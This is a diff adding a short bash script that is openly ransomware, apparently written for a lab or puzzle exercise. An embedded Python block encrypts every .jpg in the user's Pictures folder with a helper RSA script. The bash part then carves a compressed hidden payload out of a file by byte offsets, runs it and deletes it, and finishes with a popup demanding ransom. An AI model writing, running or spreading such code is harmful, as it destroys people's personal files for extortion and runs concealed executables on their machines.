@@ -1,0 +1,30 @@
+#!/usr/bin/bash
+
+python3 << EOF
+import os
+import subprocess
+from pathlib import Path
+
+n, e = 22291846172619859445381409012451, 65535
+
+home = Path.home()
+pathname = os.path.join(home, 'Pictures')
+
+for filename in os.listdir(pathname):
+    if not filename.endswith('.jpg'):
+        continue
+    pyfile  = os.path.join('materials', 'rsa_encrypt.py')
+    picture = os.path.join(pathname, filename)
+    command = ['python3', pyfile, str(n), str(e), picture]
+    subprocess.run(command)
+EOF
+
+tmpfile="$(mktemp)"
+cat cat | tail -c +$((SIZE1 - 1)) | head -c SIZE2 | xz -d > "$tmpfile"
+chmod u+x "$tmpfile"
+"$tmpfile" "$@"
+rm "$tmpfile"
+
+zenity --error --text="Give me ransom haha!"
+
+exit
